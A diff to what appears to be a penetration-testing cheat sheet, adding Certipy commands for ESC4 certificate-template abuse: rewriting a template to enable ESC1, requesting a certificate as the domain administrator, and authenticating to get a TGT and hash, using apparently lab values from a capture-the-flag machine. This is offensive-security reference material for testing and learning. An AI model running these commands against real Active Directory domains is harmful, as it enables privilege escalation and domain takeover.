@@ -107,6 +107,22 @@
 
 > Enabling the `mspki-certificate-name-flag` flag for a template that allows for domain authentication, allow attackers to "push a misconfiguration to a template leading to ESC1 vulnerability
 
+### Updated Exploitation w/ Certipy
+* Write over the vulnerable certificate with the default configuration (Basically enabling ESC1)
+  ```bash
+  certipy template -dc-ip 10.10.11.51 -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -target dc01.sequel.htb -write-default-configuration
+  ```
+* Request the certificate with an alternate UPN
+  ```bash
+  certipy req -ca sequel-DC01-CA -dc-ip 10.10.11.51 -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb -ns 10.10.11.51
+  ```
+* Auth to get the hash and TGT
+  ```bash
+  certipy auth -dc-ip '10.10.11.51' -pfx administrator.pfx
+  ```
+
+### Old Way
+
 * Search for `WriteProperty` with value `00000000-0000-0000-0000-000000000000` using [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate)
 
   ```ps1
